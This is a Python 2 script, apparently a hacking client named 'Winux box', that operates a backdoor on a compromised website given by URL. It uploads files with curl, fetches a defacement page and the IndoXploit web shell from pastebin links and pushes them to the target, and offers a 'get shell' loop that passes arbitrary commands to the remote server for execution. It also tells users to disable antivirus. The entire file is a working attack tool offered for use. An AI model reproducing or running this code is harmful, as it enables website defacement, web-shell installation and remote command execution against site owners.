#!usr/bin/env python
from urllib2 import *
from platform import system
import sys
from module.color import *
path = os.getcwd()
a = "%20"

def sabun():
	if system() == 'Linux':
		os.system("clear")
	if system() == 'Windows':
		os.system("cls")
def loop():
	sabun()
	chose()
def chose():
	detol = raw_input(">> ")
	if detol == "upload":
		file = raw_input("File: ")
		upload = "curl -F anjay=@"+path+"/"+file+" "+sayur+"?upload"
		os.system(upload)
		chose()
	elif detol == "get shell":
		shell()
	elif detol == "exit":
		exit();
	elif detol == "help":	
		print putih+"_______________"+kuning+"Tools"+putih+"_________________"
		print
		print putih+"upload  = Upload file "
		print putih+"function/kerupuk = Auto Deface(index.php)"
		print putih+"function/indomie = Auto upload shell"
		print
		print putih+"____________"+kuning+"Function"+putih+"_________________"
		print 
		print putih+"use = for use function ex: use function/kerupuk"
		print putih+"get shell = remote/rce target"
		print
		print putih+"_______________________________________________________\n"
	elif detol == "use function/kerupuk":
		sabun()
		eaaa = "wget https://pastebin.com/raw/XFZwUUaQ -o index.php"
		apload = "curl -F anjay=@"+path+"/index.php "+sayur+"?site"
		os.system(eaaa)
		os.system("mv XFZwUUaQ index.php")
		os.system(apload)
		print
	elif detol == "use function/indomie":
		print putih+"    1]. IndoXploit(100kb)"
		rendung = raw_input("[ "+lime+"function"+putih+"/"+lime+"indomie"+putih+" ]"+putih+"> ")
		if rendung == "1":
			loll = "wget https://pastebin.com/raw/nC6pWh5a -o "+path+"/shell/indoxploit.php"
			lopad = "curl -F anjay=@"+path+"/shell/indoxploit.php "+sayur+"?upload"
			os.system(loll)
			os.system("mv nC6pWh5a "+path+"/shell/indoxploit.php")
			os.system(lopad)
		else:
			print merah+"[!] "+putih+"Shell Backdoor not Found"
	else:
		print ""+merah+"[!] "+putih+"Command not Found"
		print "    try: help for more information"
	chose()
	loop()
def shell():
	ip = sayur+"?kntleel"
	ipe = urlopen(ip).read()
	command = raw_input(putih+"[ "+lime+ipe+putih+"@"+lime+"shell"+putih+" ]> ")
	commande = command.replace(" ","%20")
	webs = sayur+"?awokwok="+commande
	aww = urlopen(webs).read()
	print aww
	if command == "exit":
		chose()
	else:
		shell()
print merah+"[!] Run as Root!"+putih
sayur = raw_input("URL >> ")
sabun()
eaea = sayur+"?infos"
aeae = urlopen(eaea).read()
print putih+"Hi! Welcome to Winux box                                           version 3.2 codename HUT RI 74"
print putih+"Gmail : xdizzy25@gmail.com                                         You can do it!              "
print putih+"Github: https://github.com/zidangans/                              Everything is Vulnerable    "
print putih+"Use this tools with internet access                                Happy Hacking!              "
print merah+"Turn off Antivirus/Windows Defender when an error occurs\n"+putih
print lime+"[*] "+putih+"URL        : "+sayur+""
print aeae
chose()